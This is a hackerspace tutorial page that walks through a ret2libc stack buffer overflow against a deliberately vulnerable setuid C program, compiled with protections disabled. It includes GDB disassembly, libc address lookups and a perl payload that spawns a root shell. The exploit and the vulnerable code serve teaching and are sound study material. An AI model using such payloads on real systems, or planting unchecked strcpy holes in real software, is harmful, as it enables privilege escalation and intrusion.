<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><title>Exploiting a Stack Buffer Overflow (ret2libc method) | 801 Labs</title><meta name="description" content="description"/><link rel="canonical" href="https://www.801labs.org/research-portal/post/stack-exploitation"/><link rel="icon" href="/favicon.png" sizes="16x16"/><meta property="og:title" content="Exploiting a Stack Buffer Overflow (ret2libc method) | 801 Labs"/><meta property="og:description" content="801 Labs is a Salt Lake City based hackerspace created by local information technology, electronics, and information security enthusiasts."/><meta property="og:image" content="https://www.801labs.org2019/01/gef.jpg"/><meta property="og:url" content="https://www.801labs.org/research-portal/post/stack-exploitation"/><meta property="og:site_name" content="801 Labs"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@801Labs"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="theme-color" content="#6bf0c2"/><link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;0,900;1,400&amp;family=Tomorrow:wght@400;600;700&amp;display=swap" rel="stylesheet"/><meta name="google-site-verification" content="QnlAT_0caLTAeL1e8V-RlHWBX7xauM_CnxY_5-ltIF4"/><link rel="preload" href="/_next/static/css/63a0cb2b4cb051440404.css" as="style"/><link rel="stylesheet" href="/_next/static/css/63a0cb2b4cb051440404.css" data-n-g=""/><noscript data-n-css="true"></noscript><link rel="preload" href="/_next/static/chunks/main-b734f4d0c2c599295fe6.js" as="script"/><link rel="preload" href="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" as="script"/><link rel="preload" href="/_next/static/chunks/framework.464b393922c27508c360.js" as="script"/><link rel="preload" href="/_next/static/chunks/commons.baecec2b1f31cc8f0ab6.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/_app-e662323251d69bbbf5e5.js" as="script"/><link rel="preload" href="/_next/static/chunks/cb1608f2.9b44609261640b8f626b.js" as="script"/><link rel="preload" href="/_next/static/chunks/a9a7754c.53d20200875279da8636.js" as="script"/><link rel="preload" href="/_next/static/chunks/16bc220b6d50f93026463b2cd002c45681ffbe2f.62ec2799f7445d763091.js" as="script"/><link rel="preload" href="/_next/static/chunks/269ea3ef5216fdb5e29fe1b24ee03a8936e3d31a.82f69e01bd7fbd7d6f07.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/research-portal/post/%5Bslug%5D-4d5753f44f6a2e9d1cc2.js" as="script"/></head><body><div id="__next"><div class="bg-white font-sans fluid-text-base"><div class="fixed inset-0 z-40 bg-graphite-800 hidden" style="--bg-opacity:0.4"></div><div class="fixed right-0 top-0 h-screen overflow-y-auto z-50 w-full sm:w-64 font-display bg-graphite-800 text-white hidden"><div class="px-5 pt-5 text-right"><button class="px-4 py-2" title="Close Menu"><span class="sr-only">Close Menu</span><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="times" class="svg-inline--fa fa-times fa-w-11 fa-lg " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg></button></div><ul class="pt-2 pb-5 fluid-text-lg"><li><a class="py-1 px-5 link--white" href="/about/">About</a><ul class="fluid-text-base"><li><a class="py-1 pl-10 pr-5 link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/about/news/1/">News</a></li></ul></li><li><a class="py-1 px-5 link--white" href="/research-portal/1/">Learn</a></li><li><a class="py-1 px-5 link--white" href="/get-involved/">Get Involved</a><ul class="fluid-text-base"><li><a class="py-1 pl-10 pr-5 link--white" href="/get-involved/events/">Events</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="py-1 pl-10 pr-5 link--white" href="/hackercamp/">Hackercamp</a></li></ul></li><li><a class="py-1 px-5 link--white" href="/nonprofit/">Nonprofit</a></li><li><a class="py-1 px-5 link--white" href="/contact/">Contact Us</a></li><li><a class="py-1 px-5 link--tangerine font-bold" href="/donate/">Donate &gt;</a></li></ul></div><div class="page"><header class="page-header font-display bg-graphite-800 text-white"><div class="container mx-auto px-5 lg:px-10 xl:px-16 py-3 lg:py-5 flex"><div class="flex-initial"><a class="text-white" href="/"><svg xmlns="http://www.w3.org/2000/svg" class="fill-current" viewBox="0 0 1566.7 420.9" width="217"><title>801 Labs - a Community Hackerspace</title><path d="M131.5 261.8h24.1c1.8 0 3.2 1.5 3.2 3.2 0 1.8-1.5 3.2-3.2 3.2h-24.1c-1.8 0-3.2-1.5-3.2-3.2-.1-1.8 1.4-3.2 3.2-3.2z"></path><path d="M194.9 148.8V60.9c13-4.1 21.9-16.1 21.9-29.8 0-17.2-14-31.2-31.2-31.2h-85.3c-13.6.1-25.7 9-29.7 22-5.1 16.4 4.1 33.9 20.5 39v87.8c-7.5 2.9-14.8 6.5-21.7 10.6-67.6 40.6-89.6 128.2-49.1 195.8 12.9 21.3 31 39.1 52.6 51.6 18.4 10.7 29.7 12.9 32.7 13.4 12.1 1.7 22.7-1.3 30.5-8.8 9.3-8.8 14.9-23.7 16.6-44.2.6-8.6.7-17.3.3-25.9 3.6-2.4 6.3-6.1 7.3-10.7l.3-1.2c0-.6.1-1.5.1-2.4h16c6.3 0 11.5-5.1 11.5-11.4v-.9h-.2c.1-.6.2-1.2.2-1.7l.2-34.4c0-1.5-1.2-2.6-2.6-2.6h-1.2c-1.5 0-2.6-1.2-2.6-2.7l.1-39.6c0-1.4-1.2-2.6-2.6-2.6l-71.7-.2c-1.4 0-2.6 1.2-2.6 2.6l-.1 39.6c0 1.4-1.2 2.6-2.6 2.6h-1.2c-1.4 0-2.6 1.2-2.6 2.6l-.1 34.6c0 .6.1 1.3.2 1.9h-.2v.7c0 6.3 5.1 11.5 11.4 11.5h16.3c.1.8.4 1.6.6 2.4 0 0 3.3 8.8 9.1 12.8 1 22.2-.7 46.7-11.5 56.8-4.1 3.9-9.4 5.3-16.5 4.3-.4-.1-9.7-1.5-26.5-11.2-19.1-11-35.1-26.7-46.5-45.6-3.5-5.8-6.5-11.9-9-18.2-25.6-64.5 6-137.5 70.4-163.1 2-.8 11.7-5.7 11.7-11.3V54.2v-.6c0-4.6-3.7-8.2-8.2-8.2-7.8-.1-14-6.6-13.9-14.4.1-7.8 6.6-14 14.4-13.9h85.3c7.8-.1 14.2 6.1 14.4 13.9.1 7.8-6.1 14.2-13.9 14.4h-.6c-4.5.3-7.9 4.3-7.6 8.9v99.5c0 5.9 9.8 10.6 11.7 11.3 47.9 19.1 79.3 65.5 79.3 117 0 57.5-38.5 107.7-93.5 122.1-3.7 1-6.3 4.4-6.3 8.2 0 4.7 3.8 8.5 8.5 8.5.7 0 1.5-.1 2.2-.2 62.5-16.4 106.2-73.4 106.2-138.6-.1-59-36.3-111.9-91.2-133.3zm-62.8 155.4l-1.6 7.7c-.4 1.5-1.7 2.5-3.2 2.5l-13.4-.3c-1.5 0-2.6-1.2-2.6-2.7V291c0-1.4 1.2-2.6 2.6-2.6h1.2c1.4 0 2.6-1.2 2.6-2.6l.1-39.6c0-1.4 1.2-2.6 2.6-2.6h5.4c1.4 0 2.6 1.2 2.6 2.6v7.6c0 1.5 1.2 2.6 2.6 2.6h1.2c1.4 0 2.6-1.2 2.6-2.6v-7.3c0-1.4 1.2-2.6 2.6-2.7l11.9-.1c1.4.1 2.5 1.2 2.5 2.6v7.5c0 1.4 1.2 2.6 2.6 2.6h1.3c1.4 0 2.6-1.2 2.6-2.6v-7.6c0-1.4 1.2-2.6 2.6-2.6h5.3c1.5 0 2.7 1.1 2.7 2.6v.1l-.1 39.6c0 1.5 1.2 2.6 2.6 2.6h1.2c1.5 0 2.6 1.2 2.6 2.6v20.4c0 1.4-1.2 2.6-2.6 2.6h-13.4c-1.5-.1-2.8-1.1-3.1-2.6l-1.6-7.7c-.4-1.5-1.6-2.5-3.1-2.5l-16.4.2c-1.2.2-2.5 1.2-2.9 2.7z"></path><path d="M453.1 366.9c-40 0-64.9-24.1-64.9-59.7v-30c-.9-17 8.3-32.9 23.3-40.8-14.1-6.3-23-21.5-23-40.8v-26.9c0-35.6 24.5-59.7 64.5-59.7s64.9 24.1 64.9 59.7v26.9c0 19.3-8.9 34.5-23 40.8 15.2 7.8 24.4 23.7 23.7 40.8v30c.1 35.7-25.1 59.7-65.5 59.7zm23.7-196.5c-.6-13-11.7-23-24.7-22.4-12.1.6-21.8 10.3-22.4 22.4V203c1.1 13 12.5 22.7 25.5 21.6 11.5-1 20.6-10.1 21.6-21.6v-32.6zm.4 100.4c0-11.5-8.2-21.9-24.1-21.9-11.8-1-22.3 7.8-23.3 19.6-.1.8-.1 1.5-.1 2.3v34.5c-.7 12.2 8.7 22.7 20.9 23.3h2.4c12.4.8 23.2-8.6 24.1-21 .1-.8.1-1.5 0-2.3v-34.5zM630.3 366.9c-40 0-65.6-25.9-65.6-64.1V173.7c0-38.6 25.5-64.1 65.6-64.1 40.1 0 66 25.5 66 64.1v129.1c-.1 38.2-25.6 64.1-66 64.1zM654 170.1c0-11.9-8.9-21.5-23.7-21.5-11.8-1-22.3 7.8-23.3 19.6-.1.6-.1 1.3-.1 1.9v135.7c0 11.9 9.6 21.6 21.4 21.6.6 0 1.3 0 1.9-.1 14.8 0 23.7-9.6 23.7-21.5V170.1zM753.7 361.4V134.2c14.1 0 19.3-9.3 19.3-19.6h23.3v246.8h-42.6zM930.6 361.4V114.5h45.9v206.1h69v40.8H930.6zM1174.8 361.4l-8.2-48.4h-43.7l-8.9 48.4h-43l49.6-246.8h51.5l49.5 246.8h-46.8zm-28.9-180.2l-16.7 95.3h31.5l-14.8-95.3zM1335.3 361.4h-77.8V114.5h77.2c33.7 0 54.5 18.2 54.5 52.3v26.9c0 21.1-8.2 37.1-29.3 41.5 22.2 5.9 30.4 21.1 30.4 41.9v32.3c-.2 34.2-21.3 52-55 52zm9.6-191.3c0-11.1-4.8-17.8-16.1-17.8h-24.9v67.8h23c11.9 0 18.2-6.3 18.2-19.3l-.2-30.7zm.7 103.5c0-13-6.3-19.6-18.2-19.6h-23.7v69.9h25.9c11.5 0 16.1-6.3 16.1-17.8l-.1-32.5zM1498.4 366.9c-42.3 0-68.6-25.2-68.6-63.7v-17.1h42.3v14.5c0 18.2 8.5 28.2 25.2 28.2s24.5-9.6 24.5-24.9c0-19.6-12.6-33-37.1-51.2-24.5-18.2-52.6-42.6-52.6-77.1 0-35.6 23-66.3 67.5-66.3 38.9 0 64.9 26.9 64.9 63.4v16.1h-41.9V174c0-15.2-7.8-26.3-23.3-26.3-11.5-.8-21.4 7.8-22.2 19.3-.1 1-.1 1.9 0 2.9 0 20.8 12.2 31.5 39.6 51.5 29.3 21.9 50 44.1 50 77.5-.2 39.5-27.7 68-68.3 68z"></path></svg></a></div><div class="lg:hidden flex-1 text-right"><button class="px-4 py-2" title="Toggle Menu"><span class="sr-only">Toggle Menu</span><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="bars" class="svg-inline--fa fa-bars fa-w-14 fa-lg " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div><ul class="flex-1 hidden lg:flex justify-end fluid-text-lg"><li class="group relative"><a class="p-3 link--white" href="/about/">About</a><ul class="hidden group-focus-within:block group-hover:block py-2 absolute left-0 w-64 bg-graphite-800 fluid-text-base"><li><a class="block py-1 px-5 link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="block py-1 px-5 link--white" href="/about/news/1/">News</a></li></ul></li><li class="group relative"><a class="p-3 link--white" href="/research-portal/1/">Learn</a></li><li class="group relative"><a class="p-3 link--white" href="/get-involved/">Get Involved</a><ul class="hidden group-focus-within:block group-hover:block py-2 absolute left-0 w-64 bg-graphite-800 fluid-text-base"><li><a class="block py-1 px-5 link--white" href="/get-involved/events/">Events</a></li><li><a class="block py-1 px-5 link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="block py-1 px-5 link--white" href="/hackercamp/">Hackercamp</a></li></ul></li><li class="group relative"><a class="p-3 link--white" href="/nonprofit/">Nonprofit</a></li><li class="group relative"><a class="p-3 link--white" href="/contact/">Contact Us</a></li><li class="group relative"><a class="p-3 link--tangerine font-bold" href="/donate/">Donate &gt;</a></li></ul></div></header><main class="page-content"><div class="bg-graphite-900 bg-image-grid bg-top text-white"><div class="container-1400 mx-auto px-5 py-20 text-center"><h2 class="h1 text-shadow-glow">801 Labs Research Portal</h2></div></div><div class="container-1400 mx-auto px-5 py-20 md:flex md:space-x-20"><aside class="hidden md:block md:w-1/4"><div><h3 class="fluid-text-lg font-bold bg-black text-white px-5 py-1 mb-3">Tags</h3><ul class="px-5 py-1 space-y-2"><li><a href="/research-portal/tag/bash/1/">bash</a></li><li><a href="/research-portal/tag/biohacking/1/">biohacking</a></li><li><a href="/research-portal/tag/buffer-overflow/1/">buffer overflow</a></li><li><a href="/research-portal/tag/command-injection/1/">command injection</a></li><li><a href="/research-portal/tag/development/1/">Development</a></li><li><a href="/research-portal/tag/dll-injection/1/">DLL Injection</a></li><li><a href="/research-portal/tag/domains/1/">domains</a></li><li><a href="/research-portal/tag/ee/1/">EE</a></li><li><a href="/research-portal/tag/how-to/1/">how to</a></li><li><a href="/research-portal/tag/ipv6/1/">IPv6</a></li><li><a href="/research-portal/tag/langsec/1/">langsec</a></li><li><a href="/research-portal/tag/linux/1/">linux</a></li><li><a href="/research-portal/tag/makefile/1/">Makefile</a></li><li><a href="/research-portal/tag/memory/1/">memory</a></li><li><a href="/research-portal/tag/parsing/1/">parsing</a></li><li><a href="/research-portal/tag/pcap/1/">pcap</a></li><li><a href="/research-portal/tag/phishing/1/">phishing</a></li><li><a href="/research-portal/tag/re/1/">RE</a></li><li><a href="/research-portal/tag/research/1/">research</a></li><li><a href="/research-portal/tag/rfid/1/">RFID</a></li><li><a href="/research-portal/tag/shell/1/">shell</a></li><li><a href="/research-portal/tag/story/1/">Story</a></li><li><a href="/research-portal/tag/tutorial/1/">Tutorial</a></li><li><a href="/research-portal/tag/windows-api/1/">Windows API</a></li><li><a href="/research-portal/tag/windows-hacking/1/">Windows Hacking</a></li></ul></div></aside><div class="md:w-3/4"><h1 class="h2 mb-10">Exploiting a Stack Buffer Overflow (ret2libc method)</h1><img loading="lazy" src="/_next/static/images/gef-320-d2277d9e109013776845c770bb1abfd6.jpg" sizes="(min-width: 960px) 960px, 100vw" alt="Exploiting a Stack Buffer Overflow (ret2libc method)" class="mb-8 mx-auto max-h-100" srcSet="/_next/static/images/gef-320-d2277d9e109013776845c770bb1abfd6.jpg 320w,/_next/static/images/gef-640-d31b3392c6f005d222b20944be5ffe6e.jpg 640w,/_next/static/images/gef-960-f7ace55ae4b30dd131e9d735af78c980.jpg 960w,/_next/static/images/gef-1280-c132bcd7fe22557b565bdfd266b67bee.jpg 1280w,/_next/static/images/gef-1373-6a5b40dcbe8457a228afc90e9f097c84.jpg 1373w" width="1373" height="1127" style="max-width:min(100%, 1373px)"/><div class="space-y-6 markdown"><p>A stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.</p>
<p>In this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the <code>system</code> and <code>exit</code> sys calls for demonstration.</p>
<p>To have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching <a href="https://www.youtube.com/watch?v=7dLZRMDcY6c">stack</a> and <a href="https://www.youtube.com/watch?v=XbZQ-EonR_I">call stack</a>.</p>
<h2>Creating a vulnerable binary to test on</h2>
<p>To practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.</p>
<pre><code>#include &#x3C;string.h>
#include &#x3C;unistd.h>
#include &#x3C;sys/cdefs.h>

int main(int argc, char** argv) {

    setuid(0);

    if (argc > 1) {
        char buf[256];
        strcpy(buf, argv[1]);
    }

    return 0;
}
</code></pre>
<p>For the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.</p>
<p><code>gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c</code></p>
<ul>
<li><code>-g</code>: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.</li>
<li><code>-fno-stack-protector</code>: Disables stack smashing protectors (SSP).</li>
<li><code>-z execstack</code>: Makes stack frames executable.</li>
<li><code>-o sof</code>: Output (compiled) binary name will be sof.</li>
<li><code>-mpreferred-stack-boundary=2</code>: aligns the stack boundary in our binary to 4 bytes.</li>
</ul>
<p>ASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding <code>kernel.randomize_va_space = 0</code> to <code>/etc/sysctl.conf</code> or <code>echo 0 > /proc/sys/kernel/randomize_va_space</code>. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to <code>cat /proc/sys/kernel/randomize_va_space</code>. If the output is a positive number, it's enabled.</p>
<h2>Assembler dump breakdown</h2>
<p>Let's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master 
⇒  gdb -q 	bin/sof                                              
[*] No debugging session active
GEF for linux ready, type `gef' to start, `gef config' to configure
67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6
Reading symbols from bin/sof...done.
@gef➤  disassemble main
Dump of assembler code for function main:
   0x08048416 &#x3C;+0>:	push   ebp
   0x08048417 &#x3C;+1>:	mov    ebp,esp
   0x08048419 &#x3C;+3>:	sub    esp,0x100
   0x0804841f &#x3C;+9>:	push   0x0
   0x08048421 &#x3C;+11>:	call   0x8048300 &#x3C;setuid@plt>
   0x08048426 &#x3C;+16>:	add    esp,0x4
   0x08048429 &#x3C;+19>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804842d &#x3C;+23>:	jle    0x8048447 &#x3C;main+49>
   0x0804842f &#x3C;+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048432 &#x3C;+28>:	add    eax,0x4
   0x08048435 &#x3C;+31>:	mov    eax,DWORD PTR [eax]
   0x08048437 &#x3C;+33>:	push   eax
   0x08048438 &#x3C;+34>:	lea    eax,[ebp-0x100]
   0x0804843e &#x3C;+40>:	push   eax
   0x0804843f &#x3C;+41>:	call   0x80482e0 &#x3C;strcpy@plt>
   0x08048444 &#x3C;+46>:	add    esp,0x8
   0x08048447 &#x3C;+49>:	mov    eax,0x0
   0x0804844c &#x3C;+54>:	leave  
   0x0804844d &#x3C;+55>:	ret    
End of assembler dump.
@gef➤  q


   0x08048416 &#x3C;+0>:	push   ebp
   0x08048417 &#x3C;+1>:	mov    ebp,esp
   0x08048419 &#x3C;+3>:	sub    esp,0x100
</code></pre>
<p>These first few lines above are called a function prologue. <code>push ebp</code> pushes our base pointer onto the stack. Then <code>mov ebp,esp</code> copies the value of <code>esp</code> (stack pointer) into the <code>ebp</code> register making <code>ebp</code> == <code>esp</code>. Next, <code>sub esp,0x100</code> moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for <code>char buf[256]</code>.</p>
<pre><code>   0x0804841f &#x3C;+9>:	push   0x0
   0x08048421 &#x3C;+11>:	call   0x8048300 &#x3C;setuid@plt>
</code></pre>
<p>Push 0 onto the stack as an argument for the call to <code>setuid()</code>.</p>
<pre><code>   0x08048426 &#x3C;+16>:	add    esp,0x4
   0x08048429 &#x3C;+19>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804842d &#x3C;+23>:	jle    0x8048447 &#x3C;main+49>
</code></pre>
<p>The next instruction <code>cmp DWORD PTR [ebp+0x8],0x1</code> compares the first argument of main (argc) to 1. The following <code>jle</code> instruction uses the result of this comparison. It takes the result and jumps to <code>&#x3C;main+39></code> if the result is less than or equal to the value stored at <code>0x8048412</code>, which is 1. If you look at the C source above, you can see this is essentially our <code>if (argc >) {...}</code> condition.</p>
<pre><code>   0x0804842f &#x3C;+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048432 &#x3C;+28>:	add    eax,0x4
   0x08048435 &#x3C;+31>:	mov    eax,DWORD PTR [eax]
   0x08048437 &#x3C;+33>:	push   eax
</code></pre>
<p>Here, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of <code>argv[1]</code>. Next, <code>mov eax,DWORD PTR [eax]</code> takes the value at <code>argv[1]</code> and copies it into the <code>eax</code> register. <code>push eax</code> pushes this value onto the stack.</p>
<pre><code>   0x08048438 &#x3C;+34>:	lea    eax,[ebp-0x100]
   0x0804843e &#x3C;+40>:	push   eax
</code></pre>
<p><code>lea eax,[ebp-0x100]</code> calculates the address of <code>ebp-0x100</code> and stores the address in <code>eax</code>. <code>push eax</code> pushes this address onto the stack.</p>
<pre><code>   0x0804843f &#x3C;+41>:	call   0x80482e0 &#x3C;strcpy@plt>
</code></pre>
<p>The <code>call</code> instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to <code>strcpy@plt</code>. The reason a return address is pushed onto the stack is so that when <code>strcpy@plt</code> finishes executing, the program knows where to return execution.</p>
<pre><code>   0x08048444 &#x3C;+46>:	add    esp,0x8
   0x08048447 &#x3C;+49>:	mov    eax,0x0
   0x0804844c &#x3C;+54>:	leave  
   0x0804844d &#x3C;+55>:	ret    
</code></pre>
<p>These last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. <code>add esp,0x8</code> adds 8 bytes to the address <code>esp</code> points to. Then <code>mov eax,0x0</code> zeros out whatever is stored in the <code>eax</code> register. The <code>leave</code> instruction does a couple of things. It releases the stack frame and then copies the base pointer (<code>ebp</code>) into <code>esp</code>. This releases the space that was allocated to the previous stack frame. Finally, the <code>ret</code> instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.</p>
<h1>Exploiting the SOF vulnerability</h1>
<p>Now that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master 
⇒  bin/sof $(perl -e 'print "A" x 260')
[1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print "A" x 260')
</code></pre>
<p>When we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.</p>
<h2>Creating the payload</h2>
<p>In order to successfully call <code>system</code>, we need to place a few different values on the stack, when we overflow the buffer. We need the address of "/bin/sh" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.</p>
<p>To get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.</p>
<p>To see the absolute path to the libc.so library that our binary uses, we use <code>ldd</code>. This is needed for the next step.</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒  ldd bin/sof
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib/libc.so.6 (0xf7deb000)
	/lib/ld-linux.so.2 (0xf7fd4000)
</code></pre>
<p>Next, we use <code>strings</code> to report the offset of any string it finds in libc.so and grep the output for what we're after.</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   
 16a23e /bin/sh
</code></pre>
<p>Running <code>vmmap</code> will also provide the starting address of libc.so when ran from a active gdb session.</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master 
⇒  gdb -q bin/sof

@gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof
0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof
0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so
0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so
0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so
0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so
0xf7fa8000 0xf7fab000 0x00000000 rwx 
0xf7fcd000 0xf7fcf000 0x00000000 rwx 
0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]
0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]
0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so
0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so
0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so
0xfffda000 0xffffe000 0x00000000 rwx [stack]

@gef➤  q
</code></pre>
<p>We calculate the address by taking the start address of <code>/usr/lib/libc-2.26.so</code> and add the offset of the string. I like to use <code>printf</code> for this. If you use printf in gdb, you have to add <code>shell</code> before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒  printf "0x%x\n" $((0xf7deb000 + 0x16a23e))  
0xf7f5523e
</code></pre>
<p>To verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.</p>
<pre><code>@gef➤  x/s 0xf7f5523e
0xf7f5523e:	"/bin/sh"
</code></pre>
<p>And now, we just need the address of <code>system</code>.</p>
<pre><code>@gef➤  p system
$1 = {&#x3C;text variable, no debug info>} 0xf7e2c540 &#x3C;__libc_system>

@gef➤  q
</code></pre>
<p>Because I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this <a href="https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea">script</a> that takes a memory address and reverses it.</p>
<p>Reverse system address</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒  raddr -a 0xf7e2c540
\x40\xc5\xe2\xf7
</code></pre>
<p>Reverse "/bin/sh" string address</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒  raddr -a 0xf7f5523e
\x3e\x52\xf5\xf7
</code></pre>
<p>And for the return address, we can use anything for the time being.</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master 
⇒   raddr -a 0xdeadc0de
\xde\xc0\xad\xd
</code></pre>
<p>We modify the command we ran earlier, adding the reversed addresses onto the end of the payload.</p>
<pre><code>#
# [      260 x "A" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]
#
th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒  bin/sof $(perl -e 'print "A" x 260 . "\x40\xc5\xe2\xf7" . "\xde\xc0\xad\xde" . "\x3e\x52\xf5\xf7"')
@sh-4.4# whoami
root
@sh-4.4# exit
exit
[1]    9121 segmentation fault  bin/sof 
</code></pre>
<p>We successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the <code>exit</code> system call address instead. Doing so should give us a clean exit.</p>
<pre><code>@gef➤  p exit
$2 = {&#x3C;text variable, no debug info>} 0xf7e1e8f0 &#x3C;__GI_exit>

@gef➤  q
</code></pre>
<p>Reverse exit's address</p>
<pre><code>th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master 
⇒  raddr -a 0xf7e1e8f0 
\xf0\xe8\xe1\xf7
</code></pre>
<p>And now replace the invalid return address with it in our payload.</p>
<pre><code>#
# [      260 x "A" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]
#
th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master
⇒  bin/sof $(perl -e 'print "A" x 260 . "\x40\xc5\xe2\xf7" . "\xf0\xe8\xe1\xf7" . "\x3e\x52\xf5\xf7"')
@sh-4.4# whoami
root
@sh-4.4# exit
exit
